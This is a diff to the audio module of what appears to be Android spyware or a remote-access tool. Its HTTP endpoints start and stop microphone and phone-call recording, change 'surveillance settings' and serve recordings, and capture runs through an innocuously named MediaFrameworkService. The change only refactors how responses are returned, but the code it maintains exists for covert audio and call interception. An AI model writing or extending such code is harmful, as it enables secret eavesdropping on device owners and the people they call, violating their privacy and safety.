@@ -38,17 +38,17 @@ public class AcousticsModule extends BaseModule {
         if (uri.equals("/audio")) {
             return serveAudioPage(session);
         } else if (uri.equals("/audio/mic/start")) {
-            return startMicRecording(params);
+            return startMicRecording(session, params);
         } else if (uri.equals("/audio/mic/stop")) {
-            return stopMicRecording();
+            return stopMicRecording(session);
         } else if (uri.equals("/audio/call/start")) {
             return startCallRecording(params);
         } else if (uri.equals("/audio/call/stop")) {
-            return stopCallRecording();
+            return stopCallRecording(session);
         } else if (uri.equals("/audio/status")) {
             return serveAudioStatus();
         } else if (uri.equals("/audio/settings")) {
-            return updateAudioSettings(params);
+            return updateAudioSettings(session, params);
         } else if (uri.equals("/audio/recordings")) {
             return serveAudioRecordings(session);
         } else if (uri.equals("/audio/stream")) {
@@ -211,7 +211,7 @@ public class AcousticsModule extends BaseModule {
         return server.serveGzippedProxy(session, "text/html", html.toString());
     }
 
-    private Response startMicRecording(Map<String, String> params) {
+    private Response startMicRecording(IHTTPSession session, Map<String, String> params) {
         FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Microphone surveillance started");
         int duration = 0;
         if (params.containsKey("duration")) {
@@ -230,10 +230,10 @@ public class AcousticsModule extends BaseModule {
                 "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                 +
                 "<h2>&#127897; Starting microphone recording...</h2></body></html>";
-        return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+        return server.serveGzippedProxy(session, "text/html", html);
     }
 
-    private Response stopMicRecording() {
+    private Response stopMicRecording(IHTTPSession session) {
         FirebaseConfig.logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
         android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
         intent.setAction(Constants.ACTION_STOP_MIC_REC);
@@ -243,7 +243,7 @@ public class AcousticsModule extends BaseModule {
                 "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                 +
                 "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
-        return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+        return server.serveGzippedProxy(session, "text/html", html);
     }
 
     private Response startCallRecording(Map<String, String> params) {
@@ -262,7 +262,7 @@ public class AcousticsModule extends BaseModule {
         return newResponse(Response.Status.OK, "application/json", json);
     }
 
-    private Response stopCallRecording() {
+    private Response stopCallRecording(IHTTPSession session) {
         FirebaseConfig.logActivity("ACOUSTICS_TERMINATED: Call recording ended");
         android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
         intent.setAction(Constants.ACTION_STOP_CALL_REC);
@@ -272,7 +272,7 @@ public class AcousticsModule extends BaseModule {
                 "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                 +
                 "<h2>&#9724; Stopping call recording...</h2></body></html>";
-        return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+        return server.serveGzippedProxy(session, "text/html", html);
     }
 
     private Response serveAudioStatus() {
@@ -299,7 +299,7 @@ public class AcousticsModule extends BaseModule {
         return newResponse(Response.Status.OK, "application/json", json);
     }
 
-    private Response updateAudioSettings(Map<String, String> params) {
+    private Response updateAudioSettings(IHTTPSession session, Map<String, String> params) {
         FirebaseConfig.logActivity("ACOUSTICS_PROTOCOL: Surveillance settings updated");
         boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
         boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));
@@ -313,7 +313,7 @@ public class AcousticsModule extends BaseModule {
 
         String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                 "<body></body></html>";
-        return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+        return server.serveGzippedProxy(session, "text/html", html);
     }
 
     private Response serveAudioRecordings(IHTTPSession session) {
